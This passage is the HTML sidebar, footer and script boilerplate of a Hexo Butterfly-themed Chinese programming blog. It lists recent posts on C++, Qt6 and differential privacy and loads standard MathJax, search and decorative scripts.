datetime="2025-05-11T01:55:46.000Z" title="发表于 2025-05-11 09:55:46">2025-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/05/C-%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/" title="C++后端开发入门-环境配置与多线程编程">C++后端开发入门-环境配置与多线程编程</a><time datetime="2025-05-05T14:17:09.000Z" title="发表于 2025-05-05 22:17:09">2025-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/05/Qt6%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%85%A5%E9%97%A8/" title="Qt6开发入门-环境配置与入门">Qt6开发入门-环境配置与入门</a><time datetime="2025-05-05T13:30:44.000Z" title="发表于 2025-05-05 21:30:44">2025-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/03/%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81%E5%AE%9E%E8%B7%B5%E5%85%A5%E9%97%A8/" title="差分隐私实践入门">差分隐私实践入门</a><time datetime="2025-05-03T08:15:35.000Z" title="发表于 2025-05-03 16:15:35">2025-05-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/%E5%85%AC%E5%91%8A-%E6%97%A0%E9%99%90%E6%9C%9F%E5%81%9C%E6%9B%B4/" title="公告-无限期停更">公告-无限期停更</a><time datetime="2024-12-26T08:21:05.000Z" title="发表于 2024-12-26 16:21:05">2024-12-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Monoceros406</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="docsearch-wrap"><div id="docsearch" style="display:none"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css/dist/style.min.css"/><script src="https://cdn.jsdelivr.net/npm/@docsearch/js/dist/umd/index.min.js"></script><script>(() => {
  docsearch(Object.assign({
    appId: '',
    apiKey: '',
    indexName: '',
    container: '#docsearch',
  }, null))

  const handleClick = () => {
    document.querySelector('.DocSearch-Button').click()
  }

  const searchClickFn = () => {
    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', handleClick)
  }

  searchClickFn()
  window.addEventListener('pjax:complete', searchClickFn)
})()</script></div></div></body></html>